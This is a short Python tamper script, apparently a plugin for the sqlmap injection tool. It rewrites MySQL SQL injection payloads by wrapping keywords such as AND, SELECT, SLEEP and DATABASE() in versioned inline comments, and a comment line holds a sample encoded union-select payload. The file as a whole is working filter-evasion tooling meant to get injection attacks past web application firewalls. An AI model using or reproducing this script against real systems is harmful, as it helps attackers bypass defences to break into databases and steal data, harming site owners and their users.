import os
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHEST
def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" %
    (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))
def tamper(payload, **kwargs):
#%23a%0aunion/*!44575select*/1,2,3
   if payload:
       payload = payload.replace('AND', '/*!11440AND*/')
       payload = payload.replace('ORDER', 'order/*!77777cz*/')
       payload = payload.replace("SELECT", "/*!11440SELECT*/")
       payload = payload.replace("SLEEP(", "sleep/*!77777cz*/(")
       payload = payload.replace("UPDATEXML(", "UPDATEXML/*!77777cz*/(")
       payload = payload.replace("SESSION_USER()", "/*!11440SESSION_USER()*/")
       payload = payload.replace("USER())", "USER/*!80000aaa*//*!80000aaa*/())")
       payload = payload.replace("DATABASE()", "DATABASE/*!80000aaa*//*!80000aaa*/()")
       payload = payload.replace("by","/*!80000aaa*//*!80000aaa*//*!80000aaa*/by")
   return payload